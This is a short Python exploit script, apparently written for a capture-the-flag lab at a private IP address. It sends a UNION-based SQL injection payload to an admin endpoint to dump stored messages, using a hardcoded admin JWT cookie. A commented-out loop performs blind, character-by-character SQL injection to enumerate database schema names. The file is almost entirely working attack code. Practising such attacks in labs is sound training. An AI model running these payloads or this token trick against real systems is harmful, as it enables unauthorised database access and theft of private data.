#!/usr/bin/env python3

import requests

from string import printable

url = "http://10.10.218.165/admin"

cookies = {
	"token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2MDM0OTIxMjJ9.3FXTGY_dkJaVit5NvdAUR3W9o-wvW9aCb3euRkBCgcw"

}


r = requests.get(
    url,
    params={
        "user": "0 union select (SELECT GROUP_CONCAT( message_content ) FROM messages),2,3,4 -- -"
    },
    cookies=cookies,
)

print(r.text)



# known = list()

# while 1:
# 	for char in printable:
# 		print(f"trying {char}\r", end="")

# 		r = requests.get(url, params = {

# 				"user":f"(IF(SUBSTR((SELECT GROUP_CONCAT( SCHEMA_NAME ) FROM INFORMATION_SCHEMA.SCHEMATA),{len(known)},1)={char},1,2)) #",

# 			}, cookies = cookies)

# 		# print(r.text)
# 		if "false" in r.text:
# 			print(f"CORRECT CHAR {char}")
# 			known.append(char)
# 			print("".join(known))
# 		else:

# 			continue
